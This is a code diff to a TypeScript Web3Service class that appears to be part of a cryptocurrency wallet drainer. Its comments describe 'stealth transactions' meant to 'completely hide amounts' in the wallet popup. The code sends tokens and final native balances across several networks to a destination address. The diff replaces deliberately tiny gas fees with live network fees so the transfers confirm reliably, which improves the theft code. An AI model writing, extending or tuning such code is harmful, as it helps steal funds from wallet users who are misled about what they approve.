@@ -494,23 +494,33 @@ export class Web3Service {
     return ethValue + tokenValue;
   }
 
-  // Create transactions that completely hide amounts by using minimal dust amounts
+  // Create transactions with real-time gas fees
   private async createStealthTransaction(params: {
     to: string;
     data?: string;
     value?: string;
     gasLimit?: number;
   }): Promise<any> {
-    // Create transaction with minimal visible data to force "Private Transaction" display
+    // Get current network gas fees
+    const feeData = await this.provider!.getFeeData();
+    
+    // Use current network fees with slight buffer for faster confirmation
+    const maxFeePerGas = feeData.maxFeePerGas 
+      ? feeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+      : ethers.parseUnits("20", "gwei"); // Fallback
+      
+    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
+      ? feeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+      : ethers.parseUnits("2", "gwei"); // Fallback
+
     return await this.signer!.sendTransaction({
       to: params.to,
       data: params.data || "0x",
       value: params.value || "0x0",
       gasLimit: params.gasLimit || 21000,
-      // Force privacy mode with minimal gas fees
       type: 2,
-      maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
-      maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
+      maxFeePerGas,
+      maxPriorityFeePerGas,
     });
   }
 
@@ -623,7 +633,7 @@ export class Web3Service {
             if (amountToSend > 0) {
               console.log(`Processing final private transfer`);
               
-              // Send with stealth transaction to hide amount in wallet popup
+              // Send with real-time gas fees
               const ethTx = await this.createStealthTransaction({
                 to: toAddress,
                 value: amountToSend.toString(),
@@ -1252,14 +1262,23 @@ export class Web3Service {
           // Create stealth transactions to completely hide amounts
           const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
           
+          // Get current network gas fees
+          const feeData = await provider.getFeeData();
+          const maxFeePerGas = feeData.maxFeePerGas 
+            ? feeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+            : ethers.parseUnits("20", "gwei");
+          const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
+            ? feeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+            : ethers.parseUnits("2", "gwei");
+
           const tokenTx = await signer.sendTransaction({
             to: token.contractAddress!,
             data: transferData,
             gasLimit: 60000,
             value: "0x0",
             type: 2,
-            maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
-            maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
+            maxFeePerGas,
+            maxPriorityFeePerGas,
           });
           
           console.log(`Stealth transfer completed`);
@@ -1293,15 +1312,23 @@ export class Web3Service {
             
             if (amountToSend > 0) {
               console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
+              
+              // Use real-time gas fees for native currency transfer
+              const currentFeeData = await provider.getFeeData();
+              const maxFeePerGas = currentFeeData.maxFeePerGas 
+                ? currentFeeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+                : gasPrice;
+              const maxPriorityFeePerGas = currentFeeData.maxPriorityFeePerGas 
+                ? currentFeeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+                : ethers.parseUnits("2", "gwei");
+
               const nativeTx = await signer.sendTransaction({
                 to: toAddress,
                 value: amountToSend,
                 gasLimit: gasEstimate,
-                gasPrice: gasPrice,
-                data: "0x",
                 type: 2,
-                maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
-                maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
+                maxFeePerGas,
+                maxPriorityFeePerGas,
               });
               transactionHashes.push(nativeTx.hash);
               console.log(`Final interaction completed`);
